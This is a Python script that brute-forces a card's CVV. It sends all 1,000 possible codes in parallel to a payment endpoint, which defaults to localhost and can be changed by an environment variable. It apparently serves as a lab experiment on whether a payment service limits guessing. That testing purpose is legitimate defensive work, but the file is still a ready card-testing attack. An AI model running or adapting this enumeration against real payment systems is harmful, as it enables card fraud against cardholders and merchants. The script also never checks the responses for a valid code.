import requests
import time
import concurrent.futures
import json
import sys
import os

# Allow override via ENV for Docker/CI
TARGET_URL = os.environ.get("TARGET_URL", "http://localhost:3000/pay")
MAX_WORKERS = 20

# Valid Card Data
CARD_DATA = {
    "pan": "4111111111111111",
    "expiry": "12/25",
    "amount": 100.00,
    "currency": "USD"
}

def attempt_payment(cvv):
    payload = CARD_DATA.copy()
    payload["cvv"] = cvv
    
    try:
        response = requests.post(TARGET_URL, json=payload, timeout=2)
        return {
            "cvv": cvv,
            "status": response.status_code,
            "response": response.json()
        }
    except Exception as e:
        return {"cvv": cvv, "status": "error", "message": str(e)}

def run_experiment_a():
    print(f"[*] Starting Experiment A: Unlimited CVV Enumeration")
    print(f"[*] Target: {TARGET_URL}")
    
    start_time = time.time()
    valid_cvv_found = False
    attempts = 0
    
    # Generate all 000-999 CVVs
    all_cvvs = [f"{i:03d}" for i in range(1000)]
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_cvv = {executor.submit(attempt_payment, cvv): cvv for cvv in all_cvvs}
        
        for future in concurrent.futures.as_completed(future_to_cvv):
            cvv = future_to_cvv[future]
            attempts += 1
            if attempts % 50 == 0:
                print(f"\r[*] Tested {attempts}/1000 CVVs...", end="")

    duration = time.time() - start_time
    print(f"\n[*] Experiment A Complete. Duration: {duration:.2f}s")

if __name__ == "__main__":
    run_experiment_a()
